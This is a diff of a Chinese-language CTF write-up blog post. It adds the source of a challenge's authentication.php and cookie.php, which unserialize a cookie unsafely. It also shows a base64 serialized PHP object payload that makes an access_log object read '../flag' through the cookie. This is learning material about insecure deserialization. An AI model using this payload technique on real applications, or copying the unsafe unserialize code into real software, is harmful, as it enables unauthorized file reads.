@@ -242,7 +242,119 @@ if (isset($_POST["user"]) && isset($_POST["pass"])) {
 ?>
 ```
 
-由於可以透過 `.phps`查看原始代碼，所以先去查看 `cookie.phps`和 `authentication.phps`。可以發現在 `cookie.php`中有以下漏洞：
+由於可以透過 `.phps`查看原始代碼，所以先去查看 `cookie.phps`和 `authentication.phps`。
+
+authentication.php如下：
+
+```php
+<?php
+
+class access_log
+{
+	public $log_file;
+
+	function __construct($lf) {
+		$this->log_file = $lf;
+	}
+
+	function __toString() {
+		return $this->read_log();
+	}
+
+	function append_to_log($data) {
+		file_put_contents($this->log_file, $data, FILE_APPEND);
+	}
+
+	function read_log() {
+		return file_get_contents($this->log_file);
+	}
+}
+
+require_once("cookie.php");
+if(isset($perm) && $perm->is_admin()){
+	$msg = "Welcome admin";
+	$log = new access_log("access.log");
+	$log->append_to_log("Logged in at ".date("Y-m-d")."\n");
+} else {
+	$msg = "Welcome guest";
+}
+?>
+```
+
+cookie.php如下：
+
+```php
+<?php
+session_start();
+
+class permissions
+{
+	public $username;
+	public $password;
+
+	function __construct($u, $p) {
+		$this->username = $u;
+		$this->password = $p;
+	}
+
+	function __toString() {
+		return $u.$p;
+	}
+
+	function is_guest() {
+		$guest = false;
+
+		$con = new SQLite3("../users.db");
+		$username = $this->username;
+		$password = $this->password;
+		$stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
+		$stm->bindValue(1, $username, SQLITE3_TEXT);
+		$stm->bindValue(2, $password, SQLITE3_TEXT);
+		$res = $stm->execute();
+		$rest = $res->fetchArray();
+		if($rest["username"]) {
+			if ($rest["admin"] != 1) {
+				$guest = true;
+			}
+		}
+		return $guest;
+	}
+
+        function is_admin() {
+                $admin = false;
+
+                $con = new SQLite3("../users.db");
+                $username = $this->username;
+                $password = $this->password;
+                $stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
+                $stm->bindValue(1, $username, SQLITE3_TEXT);
+                $stm->bindValue(2, $password, SQLITE3_TEXT);
+                $res = $stm->execute();
+                $rest = $res->fetchArray();
+                if($rest["username"]) {
+                        if ($rest["admin"] == 1) {
+                                $admin = true;
+                        }
+                }
+                return $admin;
+        }
+}
+
+if(isset($_COOKIE["login"])){
+	try{
+		$perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
+		$g = $perm->is_guest();
+		$a = $perm->is_admin();
+	}
+	catch(Error $e){
+		die("Deserialization error. ".$perm);
+	}
+}
+
+?>
+```
+
+可以發現在 `cookie.php`中有以下漏洞：
 
 ```php
 if (isset($_COOKIE["login"])) {
@@ -296,7 +408,7 @@ print urlencode(base64_encode(serialize($payload)));
 TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9
 ```
 
-這個就是我們最終的 Payload 啦，把它貼到 `login`的 cookie 的 value，並重新整理頁面試試看吧。
+這個就是我們最終的 Payload 啦，把它貼到 `login`的 cookie 的 value，並在`authentication.php`的頁面重新整理試試看吧。
 
 ![Pwned!](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240706161944368.png)
 
